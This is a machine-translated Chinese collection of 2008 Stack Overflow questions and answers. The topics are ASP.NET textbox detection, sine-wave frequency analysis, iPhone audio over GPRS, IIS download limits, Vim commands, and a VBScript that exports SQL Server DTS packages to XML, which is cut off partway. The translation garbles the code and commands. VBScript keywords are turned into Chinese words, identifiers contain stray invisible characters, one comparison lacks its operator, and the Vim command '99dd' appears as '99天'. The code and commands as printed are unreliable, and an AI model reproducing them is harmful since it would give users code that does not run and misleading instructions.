在 ASP.net Webforms 中，您如何检测某人按下了哪个文本框？

请不要使用 Javascript 答案。

我需要在使用 VB.NET 的代码中处理这一切。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T20:27:32.463

我怀疑没有javascript就无法完成-当您按Enter键时，浏览器会提交表单-它不会提交具有焦点的字段。因此，除非您使用 JS 将该信息添加到正在提交的表单中，否则您就不走运了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:33:14.697

为什么需要确定按下的是哪个 TextBox？您是否正在查看哪个 TextBox 被聚焦以便触发正确的按钮单击事件？

如果你想做这样的事情，我做过的一个技巧是在他们自己的面板中“分组”适当的表单元素，然后相应地设置“DefaultButton”属性。

这样做可以让我在单个表单上拥有“按名称搜索”、“按部门搜索”、“按 ID 搜索”等文本框/按钮组合，并且仍然允许用户键入他们的查询参数，按 Enter，然后在后面的代码中调用正确的搜索方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T20:27:57.800

不使用 Javascript，你就做不到。该信息不会从客户端浏览器传送到服务器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T20:28:39.873

据我所知，服务器端脚本无法检测到这一点。它根本不会被发送到服务器。它必须在客户端完成（即使用 Javascript），然后发送到服务器。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T20:34:24.087

我通过查看服务器端的 Request.Form 对象来查看搜索框是否有值，为一个站点的搜索解决了这个问题。我在我的所有页面（或母版页的基类）继承的基类中做到了这一点。如果它有一个值，那么很有可能有人输入了一些东西并按了回车键，所以我处理了搜索。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-17T20:39:32.827

在事件处理程序中，“源”对象（事件处理程序的第一个参数）是引发事件的对象。将其键入按钮并获取名称，或使用反射从非类型对象中获取信息。

此外，如果控件是您没有引发其自己的事件的 Web 控件的子控件（只是说...），那么您可以使用 OnBubbleEvent 来确定发生了什么。OnBubbleEvent 还有一个“源”参数，您可以键入或使用反射。

# vb.net - 声音样本的数学分析（作为数字数组）

> ID：87262
> 
> 赞同：11
> 
> 时间：2008-09-17T20:27:29.297
> 
> 标签：vb.net, audio, audio-analysis

我需要找到一个样本的频率，以字节数组的形式存储（在 vb 中）。样本是一个正弦波，已知频率，所以我可以检查），但数字有点奇怪，而且我的 maths-foo 很弱。值的全范围 0-255。99% 的数字在 235 到 245 的范围内，但有一些异常值低至 0 和 1，其余 1% 中高达 255。我如何对其进行标准化以消除异常值，（计算 235-245 区间，因为它可能会随着不同的样本而变化），然后我如何计算过零以获得频率？抱歉，如果这个描述是垃圾！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-09-17T20:59:32.153

FFT 可能是最好的答案，但如果你真的想用你的方法来做，试试这个：

为了规范化，首先制作一个直方图来计算每个值从 0 到 255 的出现次数。然后从每一端丢弃 X% 的值，例如：

```
for (i=lower=0;i< N*(X/100); lower++)
  i+=count[lower];
//repeat in other direction for upper 
```

现在标准化

```
A[i] = 255*(A[i]-lower)/(upper-lower)-128 
```

丢弃 -128..127 范围之外的结果。

现在您可以计算零交叉。为确保您不会被噪音所迷惑，您可能需要跟踪最后几个点的坡度，并且仅在平均坡度正确时才计算交叉口。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-09-17T20:31:10.460

解决这个问题的标准方法是考虑一个数据块，希望至少是实际频率的两倍（获取更多数据还不错，所以高估一点是好的），然后进行[FFT](http://en.wikipedia.org/wiki/FFT)并猜测频率对应到得到的 FFT 频谱中的最大数。

顺便说一句，以前在这里问过非常相似的问题——你也可以搜索这些答案。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-09-17T20:30:04.330

使用傅里叶变换，它比计算零交叉对噪声不敏感

编辑：@WaveyDavey

我找到了一个 F# 库来进行 FFT： [从这里](http://fsharpnews.blogspot.com/2007/03/fast-fourier-transforms.html)

> 事实证明，到目前为止，我为 F# 用户找到的最好的免费实现仍然是出色的 FFTW 库。他们的网站有一个预编译的 Windows DLL。我编写了最小的绑定，允许从 F# 对 FFTW 进行线程安全访问，具有 guru 和简单接口。性能极佳，32 位 Windows XP Pro 仅比 64 位 Linux 慢 35%。

现在我确定您可以从 VB.net、C# 等调用 F# lib，这应该在他们的文档中

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-09-17T21:24:57.130

如果我从您的描述中理解得很好，那么您所拥有的是一个信号，它是一个正弦信号加上一个常数加上一些随机故障的组合。说，喜欢

```
x[n] = A*sin(f*n + phi) + B + N[n] 
```

其中 N[n] 是您想要消除的“故障”噪声。

如果毛刺是一个样本长，您可以使用必须大于毛刺长度的中值滤波器来去除它们。在故障的两侧。长度为 1 的故障意味着您将有足够的中位数长度为 3 个样本。

```
y[n] = median3(x[n]) 
```

中位数是这样计算的：取你想要过滤的 x 样本 (x[n-1],x[n],x[n+1])，对它们进行排序，你的输出是中间的。

现在噪声信号已经消失，摆脱恒定信号。我知道缓冲区的长度有限且已知，因此您可以计算整个缓冲区的平均值。减去它。

现在你有了单正弦信号。您现在可以通过计算过零来计算基频。计算前一个样本低于 0 的样本数量高于 0。周期是缓冲区的样本总数除以这个，频率是周期的相反 (1/x)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T23:37:14.660

虽然我会和大多数人一起说你想要的是一个 fft 解决方案（fft 算法非常快），但如果 fft 不是答案，无论出于何种原因，你可能想尝试使用正弦曲线拟合数据拟合程序并读取拟合频率。

使用[Fityk](http://www.unipress.waw.pl/fityk/)，您可以加载数据，并拟合到`a*sin(b*x-c)`哪里`2*pi/b`会给您拟合后的频率。

Fityk 可以从 gui 中使用，从命令行中用于脚本，并且具有 C++ API，因此可以直接包含在您的程序中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:04:48.863

我用谷歌搜索“基本 fft”。[Visual Basic FFT](http://logix4u.net/DSP/Fast_Fourier_Transform/Visual_Basic_program_for_Fast_Fourier_Transform.html)您的问题尖叫 FFT，但要小心，在不了解 DSP 的情况下使用 FFT 可能会导致您不了解或不知道它们来自何处的结果。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-18T01:12:55.757

[从http://www.relisoft.com/Freeware/index.htm](http://www.relisoft.com/Freeware/index.htm)获取频率分析器并运行它并查看代码。

# iphone - 如何在通过 GPRS 在 iPhone 浏览器上播放的 HTML 页面上嵌入音频/视频

> ID：87290
> 
> 赞同：2
> 
> 时间：2008-09-17T20:29:57.683
> 
> 标签：iphone, html

虽然我没有 iPhone 来测试这一点，但我的同事告诉我，嵌入式媒体文件（例如下面片段中的那个）仅在 iphone 通过 WLAN 连接或 3G 连接时有效，在连接时无效通过 GPRS。

```
<html><body>
<object data="http://joliclic.free.fr/html/object-tag/en/data/test.mp3" type="audio/mpeg">
   <p>alternate text</p>
</object>
</body></html> 
```

是否有带有媒体文件的示例 URL，当 iPhone 使用 GPRS（不是 3G）连接时，它将在 iPhone 浏览器中播放？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-18T07:15:13.937

iPhone YouTube 应用程序在通过 EDGE 连接时会自动下载质量低于通过 Wi-Fi 连接的视频，因为网络速度要慢得多。这一事实让我相信 Apple 会做出设计决定，不再费心通过 EDGE 下载 MP3。浏览器无法提前知道比特率是否足够低，而且很有可能不会。因此，与其用播放时间过长的声音文件（并阻止他们在下载时接听电话）让用户感到沮丧，不如让他们免于悲伤并鼓励他们寻找 Wi-Fi 热点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-27T18:41:10.083

尝试这样的事情，它适用于网页。这实际上是一个 320kps 的 mp3，但它只有 30 秒长。您可以使用名为 LAME 的程序将 mp3 转换为适合您的比特率。

```
<div class="music">
  <p>Pachelbel's Canon</p>
  <!--[if !IE]>-->
  <object id="Cannon" type="audio/mpeg" data="http://calgarydj.ca/sound%20files/Pachebels%20Cannon.mp3" width="250" height="16">
    <param name="autoplay" value="false" />
    <param name="src" value="http://calgarydj.ca/sound%20files/Pachebels%20Cannon.mp3" />
  <!--<![endif]-->
    <object id="Cannon" classid="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6" width="250" height="60">
      <param name="autostart" value="false" />

      <param name="url" value="http://calgarydj.ca/sound%20files/Pachebels%20Cannon.mp3" />
      <param name="showcontrols" value="true" />
      <param name="volume" value="100" />
    <!--[if !IE]>--></object><!--<![endif]-->
  </object>
</div><!-- end of control --> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T22:56:24.417

我不知道这个限制。尽管在您的提供商可能按字节收费的蜂窝数据服务上禁用潜在的数据量大的 OBJECT 或 EMBED 标签确实有意义，但如果这是原因，那么它仍然可以在 3G 上工作是没有意义的并且仅不在GPRS上。
也许问题是基本数据吞吐量之一？你自己（或我自己）没有 iPhone 很难测试你同事的说法。
请记住，GPRS 比 Wi-Fi 或 3G 慢得多。根据 Wikipedia，GPRS 将提供 56 到 114 kbps 的总双工吞吐量，并不是所有的都在下载方向。您已经可以看到，即使您获得最佳吞吐量并将其全部作为下载速度，它也不足以立即流式传输典型的 128 kbps mp3。
看[这个论坛讨论](http://forums.whirlpool.net.au/forum-replies-archive.cfm/832797.html)作为 Google 上提出的一个例子，GPRS 客户（那些不使用 Telestra，它是该地区的 EDGE 提供商）的速度大约为 40 kbps。因此，如果正如问题所暗示的那样，您被困在 EDGEland，而不是 3Gland 或介于两者之间的任何东西，则播放 30 秒的 mp3 需要大约 20 秒的缓冲时间。而且，当您使用像 OBJECT 或 EMBED 这样的行为模糊标签时，无法保证浏览器将如何解释它以及它是否会尝试智能地流式传输文件，而不是在启动之前必须下载整个文件。
因此，您的同事很可能只是没有等待足够长的时间来查看他选择作为测试的任何嵌入式媒体是否开始播放（假设他没有在那里使用您的 17KB 测试 mp3）。iPhone 也有可能确实有这个限制，尽管我认为谷歌会比我的快速搜索更愿意接受它，因为人们已经对他们不喜欢 iPhone 的其他事情直言不讳。另一种可能性是，它是当前与 iPhone 一起提供的 Safari 构建的限制，可能会在未来版本或其他浏览器中更改。
最终，问题是，你真正想要什么样的用户体验？GPRS 上的嵌入式音频将需要很长时间才能加载，并且用户不会享受这种体验，甚至可能根本无法体验它，如果它应该在页面访问时开始播放并且在他们导航之前它不会加载离开。在这种情况下，这可能不是一个值得努力的目标。

# asp.net - 如何限制 Asp.net 和/或 IIS 中的同时下载数量？

> ID：87294
> 
> 赞同：1
> 
> 时间：2008-09-17T20:30:12.787
> 
> 标签：asp.net, iis, download

我有一个包含很多大文件的网站。但是，我不希望用户一次开始下载 10 个文件。我注意到有一些网站只允许同时下载 2 次。

我的网站是使用在 IIS 上运行的 ASP.net 编程的。有谁知道我如何限制同时下载？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-04-09T16:31:46.300

Microsoft 的动态 IP 限制模块（目前处于测试阶段）将执行此操作。

有关详细信息和下载：[http ://www.iis.net/download/DynamicIPRestrictions](http://www.iis.net/download/DynamicIPRestrictions)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T20:37:54.920

我认为 IIS 中最大并发的唯一问题是它可能会阻止页面请求，而不仅仅是下载请求。

我会说编写一个实际执行下载的 HTTP 处理程序，然后可以决定（基于 IP 或 Cookie）是否允许将下载发送回浏览器。我认为非常简单的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:34:58.500

你想以编程方式进行吗？否则，我相信有一个来自 IIS 的 IP 地址的最大并发连接设置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:46:51.373

> 我认为 IIS 中最大并发的唯一问题是它可能会阻止页面请求，而不仅仅是下载请求。

我不是 IIS 专家，但如果此设置是针对每个域/虚拟主机的，那么您已经设置好了。如果您可以从不用于任何用途的子域提供下载内容，则该设置不会干扰同时获取多个页面元素的浏览器。

# vim - Vim 中最有说服力的命令是什么

> ID：87299
> 
> 赞同：12
> 
> 时间：2008-09-17T20:31:02.300
> 
> 标签：vim, editor

我想放弃我现在的编辑器。我觉得我需要别的东西。这不会让我的手面临 RSI 的风险。我需要看看为什么我应该更换编辑器。很高兴相信，当我 80 岁时，我将开始编码。

所有的大人物都在使用 Vim。我认识的唯一 Emacs 人是 RMS。保罗格雷厄姆是一个 Vi 家伙。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-09-17T20:33:53.230

`.`（点） - 重复上一次编辑操作。当您需要执行一些类似的编辑时非常方便。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-09-17T20:56:18.370

:help usr_12.txt

这将在帮助系统中打开一个讨论“聪明技巧”的部分。如果这些不能让你兴奋，我不知道会怎样！

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2008-09-17T20:45:29.660

[录制宏](http://julipedia.blogspot.com/2005/12/vim-macros.html)

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2008-09-17T20:32:35.900

星号。

```
* 
```

其作用：立即搜索光标下单词的下一个实例。

* * *

## 回答 #5

> 赞同：16
> 
> 时间：2008-09-18T07:38:59.013

最好的事情是您可以编辑代码的效率（这在编程中做了很多）。诸如此类的命令

*   cw 换一个词
*   dw 删除一个单词
*   ct，更改所有文本直到下一个逗号
*   ci( 更改您当前所在的括号的内容
*   xp 纠正拼写错误（“spleling” -> 光标在 l -> xp -> “spelling”）
*   o 在下面插入新行并开始编辑
*   O 在上面插入新行

然后就有可能非常快速地使用命名寄存器。要移动一个块，只需选择它，按 d，然后移动到它的新位置并按 p。比`Ctrl`-`C`和`Ctrl`-快得多`V`。使用 "ud 删除文本并将其移动以注册 u（我使用这个作为评论模板）。

而且 Vim 还具有您需要的所有脚本支持（使用它的本机脚本语言或使用 Python、Ruby ......）

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-09-17T20:36:55.563

号码。

在命令模式下输入一个数字（任意位数）输入一个命令。

该命令将被执行 $number 次

IE：

99天

擦除接下来的 99 行。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-09-17T21:11:45.353

1.  启动时间快。

2.  编辑和查看之间的明显区别。（你知道当你编辑）

3.  您找到所需内容的唯一方法是使用搜索“/”，这很好，因为它比您的眼睛快得多。

但最好的命令是：

/ - 搜索字符串

ZZ——退出

. - 重复最后插入（我认为）

%！- 插入 unix 命令

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-09-19T13:15:39.793

使用“”处理搜索字符串中的多行正则表达式`\_.`。在检查超过 4GB 各种格式的文本文件时，它曾多次救过我的命。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-09-17T20:32:02.813

为什么您希望被说服开始使用其他编辑器？如果你对现在拥有的感到满意，那就坚持下去。如果没有，也许可以询问具有您缺乏的功能的编辑器。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-03-04T18:48:11.100

即使您使用的是 Visual Studio，也有很棒的 vsvim。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-17T20:31:56.557

可爱的内置正则表达式评估器。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-09-18T07:46:50.850

我喜欢 Vim 的速度，但我发现它缺乏用于 C++ 开发的现代 IDE 的功能。[带有viPlugin](http://satokar.com/viplugin/)的Eclipse CDT是一个很好的折衷方案。

您将获得 Eclipse CDT 提供的功能和源代码概览以及 Vim 编码的速度和灵活性。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2011-04-25T23:24:35.577

也许阅读 Steve Losh 的“ [Come home to vim](http://stevelosh.com/blog/2010/09/coming-home-to-vim/) ”文章是一个好的开始，或者是关于有趣插件的[一系列视频。](http://net.tutsplus.com/sessions/vim-essential-plugins/)并且一定要在[vimcasts.org网站上看到一些文章](http://vimcasts.org/)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2012-03-14T22:51:39.567

您应该将 Caps Lock 映射到 Esc。这将使退出插入模式感觉自然，而不是您必须按 ESC 键做出尴尬的举动。此外，谁使用 Caps Lock 呢？

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2014-08-13T16:12:26.393

```
\v 
```

使您的正则表达式与 Perl 兼容。

有关更多信息，请参见[此处非常神奇的部分。](http://briancarper.net/blog/448/vim-regexes-are-awesome)

* * *

## 回答 #16

> 赞同：-2
> 
> 时间：2011-04-25T18:01:01.637

要获得真正的灵感，您必须亲眼目睹 vim 大师的实际操作。如果您没有当地的大师，这里有一个视频可以激发您的灵感。

[http://www.youtube.com/watch?v=jDWBJOXs_iI&feature=related](http://www.youtube.com/watch?v=jDWBJOXs_iI&feature=related)

如果您还不了解 vim，代码导航、切片和切块的速度将与魔术无异。学习vim几个月后，同样的编辑速度会显得司空见惯。

# sql-server-2000 - 如何为 SQL 服务器上的每个 DTS 包创建人类可读的脚本？

> ID：87303
> 
> 赞同：3
> 
> 时间：2008-09-17T20:31:11.363
> 
> 标签：sql-server-2000, packages, dts

我知道我可以编辑每个单独的 DTS 包并将其保存为 Visual Basic 脚本，但是服务器上有数百个包，这将需要很长时间。如何一次编写所有脚本？我希望能够为每个包创建一个文件，以便我可以将它们签入源代码控制，搜索它们以查看哪个引用了特定表，或者将开发服务器上的包与生产服务器上的包进行比较。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-29T22:13:42.963

我最终挖掘了 SQL 2000 文档（构建 SQL Server 应用程序/DTS 编程/编程 DTS 应用程序/DTS 对象模型）并创建了一个 VBS 脚本来读取包和编写 XML 文件。它并不完整，可以通过多种方式进行改进，但这是一个很好的开始：

GetPackages.vbs

```
选项显式

子 GetProperties（strPackageName、dtsProperties、xmlDocument、xmlProperties）
    Dim dtsProperty

    如果不是 dtsProperties 什么都不是，那么
        对于 dtsProperties 中的每个 dtsProperty
            如果 dtsProperty.Set 然后
                暗淡 xmlProperty
                设置 xmlProperty = xmlProperties.insertBefore (_
                    xmlDocument.createElement（“属性”），_
                    xmlProperties.selectSingleNode ("Property[@Name > '" & dtsProperty.Name & "']"))

                '特性
                'xmlProperty.setAttribute "Get", dtsProperty.Get
                'xmlProperty.setAttribute "Set", dtsProperty.Set
                xmlProperty.setAttribute "类型", dtsProperty.Type
                xmlProperty.setAttribute "名称", dtsProperty.Name

                如果不是 isnull(dtsProperty.Value) 则
                    xmlProperty.setAttribute "值", dtsProperty.Value
                万一

                '集合
                '获取属性的属性会导致堆栈溢出
                'GetProperties strPackageName, dtsProperty.Properties, xmlDocument, xmlProperty.appendChild (xmlDocument.createElement ("Properties"))
            万一
        下一个
    万一
结束子

子 GetOLEDBProperties (strPackageName, dtsOLEDBProperties, xmlDocument, xmlOLEDBProperties)
    暗淡 dtsOLEDB 属性

    对于 dtsOLEDBProperties 中的每个 dtsOLEDBProperty
        如果 dtsOLEDBProperty.IsDefaultValue = 0 那么
            暗淡 xmlOLEDB 属性
            设置 xmlOLEDBProperty = xmlOLEDBProperties.insertBefore (_
                xmlDocument.createElement ("OLEDBProperty"), _
                xmlOLEDBProperties.selectSingleNode ("OLEDBProperty[@Name > '" & dtsOLEDBProperty.Name & "']"))

            '特性
            xmlOLEDBProperty.setAttribute “名称”，dtsOLEDBProperty.Name
            'xmlOLEDBProperty.setAttribute "PropertyID", dtsOLEDBProperty.PropertyID
            'xmlOLEDBProperty.setAttribute "PropertySet", dtsOLEDBProperty.PropertySet
            xmlOLEDBProperty.setAttribute“值”，dtsOLEDBProperty.Value
            'xmlOLEDBProperty.setAttribute "IsDefaultValue", dtsOLEDBProperty.IsDefaultValue

            '集合
            '这些属性和上面的一样
            'GetProperties strPackageName, dtsOLEDBProperty.Properties, xmlDocument, xmlOLEDBProperty.appendChild (xmlDocument.createElement ("Properties"))
        万一
    下一个
结束子

子 GetConnections (strPackageName, dtsConnections, xmlDocument, xmlConnections)
    暗淡 dtsConnection2

    对于 dtsConnections 中的每个 dtsConnection2
        暗淡xmlConnection2
        设置 xmlConnection2 = xmlConnections.insertBefore (_
            xmlDocument.createElement ("Connection2"), _
            xmlConnections.selectSingleNode ("Connection2[@Name > '" & dtsConnection2.Name & "']"))

        '特性
        xmlConnection2.setAttribute "ID", dtsConnection2.ID
        xmlConnection2.setAttribute "名称", dtsConnection2.Name
        xmlConnection2.setAttribute "ProviderID", dtsConnection2.ProviderID

        '集合
        GetProperties strPackageName, dtsConnection2.Properties, xmlDocument, xmlConnection2.appendChild (xmlDocument.createElement ("Properties"))

        调暗 dtsOLEDB 属性
        出错时继续下一步
        设置 dtsOLEDBProperties = dtsConnection2.ConnectionProperties

        如果 Err.Number = 0 那么
            出错时转到 0
            GetOLEDBProperties strPackageName, dtsOLEDBProperties, xmlDocument, xmlConnection2.appendChild (xmlDocument.createElement ("ConnectionProperties"))
        别的
            MsgBox Err.Description & vbCrLf & "ProviderID: " & dtsConnection2.ProviderID & vbCrLf & "连接名称: " & dtsConnection2.Name, , strPackageName
            出错时转到 0
        万一

    下一个
结束子

子 GetGlobalVariables (strPackageName, dtsGlobalVariables, xmlDocument, xmlGlobalVariables)
    暗淡 dtsGlobalVariable2

    对于 dtsGlobalVariables 中的每个 dtsGlobalVariable2
        暗淡 xmlGlobalVariable2
        设置 xmlGlobalVariable2 = xmlGlobalVariables.insertBefore (_
            xmlDocument.createElement ("GlobalVariable2"), _
            xmlGlobalVariables.selectSingleNode ("GlobalVariable2[@Name > '" & dtsGlobalVariable2.Name & "']"))

        '特性
        xmlGlobalVariable2.setAttribute "名称", dtsGlobalVariable2.Name

        If Not Isnull(dtsGlobalVariable2.Value) Then
            xmlGlobalVariable2.setAttribute "Value", dtsGlobalVariable2.Value
        万一

        '没有扩展属性

        '集合
        'GetProperties strPackageName, dtsGlobalVariable2.Properties, xmlDocument, xmlGlobalVariable2.appendChild (xmlDocument.createElement ("Properties"))
    下一个
结束子

子 GetSavedPackageInfos (strPackageName, dtsSavedPackageInfos, xmlDocument, xmlSavedPackageInfos)
    暗淡 dtsSavedPackageInfo

    对于 dtsSavedPackageInfos 中的每个 dtsSavedPackageInfo
        暗淡 xmlSavedPackageInfo
        设置 xmlSavedPackageInfo = xmlSavedPackageInfos.appendChild (xmlDocument.createElement ("SavedPackageInfo"))

        '特性
        xmlSavedPackageInfo.setAttribute "描述"，dtsSavedPackageInfo.Description
        xmlSavedPackageInfo.setAttribute "IsVersionEncrypted", dtsSavedPackageInfo.IsVersionEncrypted
        xmlSavedPackageInfo.setAttribute "PackageCreationDate", dtsSavedPackageInfo.PackageCreationDate
        xmlSavedPackageInfo.setAttribute "PackageID", dtsSavedPackageInfo.PackageID
        xmlSavedPackageInfo.setAttribute "PackageName", dtsSavedPackageInfo.PackageName
        xmlSavedPackageInfo.setAttribute "VersionID", dtsSavedPackageInfo.VersionID
        xmlSavedPackageInfo.setAttribute "VersionSaveDate", dtsSavedPackageInfo.VersionSaveDate
    下一个
结束子

子 GetPrecedenceConstraints (strPackageName, dtsPrecedenceConstraints, xmlDocument, xmlPrecedenceConstraints)
    暗淡 dtsPrecedenceConstraint

    对于 dtsPrecedenceConstraints 中的每个 dtsPrecedenceConstraint
        暗淡xmlPrecedenceConstraint
        设置 xmlPrecedenceConstraint = xmlPrecedenceConstraints.insertBefore (_
            xmlDocument.createElement ("PrecedenceConstraint"), _
            xmlPrecedenceConstraints.selectSingleNode ("PrecedenceConstraint[@StepName > '" & dtsPrecedenceConstraint.StepName & "']"))

        '特性
        xmlPrecedenceConstraint.setAttribute "StepName", dtsPrecedenceConstraint.StepName

        '集合
        GetProperties strPackageName, dtsPrecedenceConstraint.Properties, xmlDocument, xmlPrecedenceConstraint.appendChild (xmlDocument.createElement ("Properties"))
    下一个
结束子

子 GetSteps (strPackageName, dtsSteps, xmlDocument, xmlSteps)
    调暗 dtsStep2

    对于 dtsSteps 中的每个 dtsStep2
        调暗 xmlStep2
        设置 xmlStep2 = xmlSteps.insertBefore (_
            xmlDocument.createElement ("Step2"), _
            xmlSteps.selectSingleNode ("Step2[@Name > '" & dtsStep2.Name & "']"))

        '特性
        xmlStep2.setAttribute "名称", dtsStep2.Name
        xmlStep2.setAttribute "描述", dtsStep2.Description

        '集合
        GetProperties strPackageName, dtsStep2.Properties, xmlDocument, xmlStep2.appendChild (xmlDocument.createElement ("Properties"))
        GetPrecedenceConstraints strPackageName, dtsStep2.PrecedenceConstraints, xmlDocument, xmlStep2.appendChild (xmlDocument.createElement ("PrecedenceConstraints"))
    下一个
结束子

子 GetColumns (strPackageName, dtsColumns, xmlDocument, xmlColumns)
    调暗 dtsColumn

    对于 dtsColumns 中的每个 dtsColumn
        暗淡 xmlColumn
        设置 xmlColumn = xmlColumns.appendChild (xmlDocument.createElement ("Column"))

        GetProperties strPackageName, dtsColumn.Properties, xmlDocument, xmlColumn.appendChild (xmlDocument.createElement ("Properties"))
    下一个
结束子

子 GetLookups (strPackageName, dtsLookups, xmlDocument, xmlLookups)
    暗淡 dtsLookup

    对于 dtsLookups 中的每个 dtsLookup
        暗淡 xmlLookup
        设置 xmlLookup = xmlLookups.appendChild (xmlDocument.createElement ("Lookup"))

        GetProperties strPackageName, dtsLookup.Properties, xmlDocument, xmlLookup.appendChild (xmlDocument.createElement ("Properties"))
    下一个
结束子

子 GetTransformations (strPackageName, dtsTransformations, xmlDocument, xmlTransformations)
    Dim dtsTransformation

    对于 dtsTransformations 中的每个 dtsTransformation
        暗淡 xmlTransformation
        设置 xmlTransformation = xmlTransformations.appendChild (xmlDocument.createElement ("Transformation"))

        GetProperties strPackageName, dtsTransformation.Properties, xmlDocument, xmlTransformation.appendChild (xmlDocument.createElement ("Properties"))
    下一个
结束子

子 GetTasks (strPackageName, dtsTasks, xmlDocument, xmlTask​​s)
    调暗 dtsTask

    对于 dtsTasks 中的每个 dtsTask
        暗淡xml任务
        设置 xmlTask​​ = xmlTask​​s.insertBefore (_
            xmlDocument.createElement（“任务”），_
            xmlTask​​s.selectSingleNode ("Task[@Name > '" & dtsTask.Name & "']"))

        ' 任务可以是任何类型的任务，每种类型的任务都有不同的属性。

        '特性
        xmlTask​​.setAttribute "CustomTaskID", dtsTask.CustomTaskID
        xmlTask​​.setAttribute "名称", dtsTask.Name
        xmlTask​​.setAttribute "描述", dtsTask.Description

        '集合
        GetProperties strPackageName, dtsTask.Properties, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("Properties"))

        如果 dtsTask.CustomTaskID = "DTSDataPumpTask" 那么
            GetOLEDBProperties strPackageName, dtsTask.CustomTask.SourceCommandProperties, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("SourceCommandProperties"))
            GetOLEDBProperties strPackageName, dtsTask.CustomTask.DestinationCommandProperties, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("DestinationCommandProperties"))
            GetColumns strPackageName, dtsTask.CustomTask.DestinationColumnDefinitions, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("DestinationColumnDefinitions"))
            GetLookups strPackageName, dtsTask.CustomTask.Lookups, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("Lookups"))
            GetTransformations strPackageName, dtsTask.CustomTask.Transformations, xmlDocument, xmlTask​​.appendChild (xmlDocument.createElement ("Transformations"))
        万一
    下一个
结束子

子 FormatXML（xmlDocument、xmlElement、intIndent）
    暗淡 xmlSubElement

    对于 xmlElement.selectNodes ("*") 中的每个 xmlSubElement
        xmlElement.insertBefore xmlDocument.createTextNode (vbCrLf & String (intIndent + 1, vbTab)), xmlSubElement
        FormatXML xmlDocument、xmlSubElement、intIndent + 1
    下一个

    如果 xmlElement.selectNodes ("*").length > 0 那么
        xmlElement.appendChild xmlDocument.createTextNode (vbCrLf & String (intIndent, vbTab))
    万一
结束子

子 GetPackage (strServerName, strPackageName)
    调暗 dtsPackage2
    设置 dtsPackage2 = CreateObject ("DTS.Package2")

    暗淡 DTSSQLStgFlag_Default
    暗淡 DTSSQLStgFlag_UseTrustedConnection

    DTSSQLStgFlag_Default = 0
    DTSSQLStgFlag_UseTrustedConnection = 256

    出错时继续下一步
    dtsPackage2.LoadFromSQLServer strServerName, , , DTSSQLStgFlag_UseTrustedConnection, , , , strPackageName

    如果 Err.Number = 0 那么
        出错时转到 0
        'fsoTextStream.WriteLine dtsPackage2.Name

        暗淡xml文档
        设置 xmlDocument = CreateObject ("Msxml2.DOMDocument.3.0")

        暗淡xmlPackage2
        设置 xmlPackage2 = xmlDocument.appendChild (xmlDocument.createElement ("Package2"))

        '特性
        xmlPackage2.setAttribute "名称", dtsPackage2.Name

        '集合
        GetProperties strPackageName, dtsPackage2.Properties, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement("Properties"))
        GetConnections strPackageName, dtsPackage2.Connections, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement ("Connections"))
        GetGlobalVariables strPackageName, dtsPackage2.GlobalVariables, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement ("GlobalVariables"))
        'SavedPackageInfos 仅适用于结构化存储文件中保存的 DTS 包
        'GetSavedPackageInfos strPackageName, dtsPackage2.SavedPackageInfos, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement ("SavedPackageInfos"))
        GetSteps strPackageName, dtsPackage2.Steps, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement ("Steps"))
        GetTasks strPackageName, dtsPackage2.Tasks, xmlDocument, xmlPackage2.appendChild (xmlDocument.createElement ("Tasks"))

        FormatXML xmlDocument, xmlPackage2, 0
        xmlDocument.save strPackageName + ".xml"
    别的
        MsgBox Err.Description, , strPackageName
        出错时转到 0
    万一
结束子

子主
    暗淡 strServerName
    strServerName = Trim (InputBox ("Server:"))

    如果 strServerName "" 那么
        昏暗 cnSQLServer
        设置 cnSQLServer = CreateObject ("ADODB.Connection")
        cnSQLServer.Open "Provider=SQLOLEDB.1;Integrated Security=SSPI;Persist Security Info=False;Initial Catalog=msdb;Data Source="&strServerName

        Dim rsDTS包
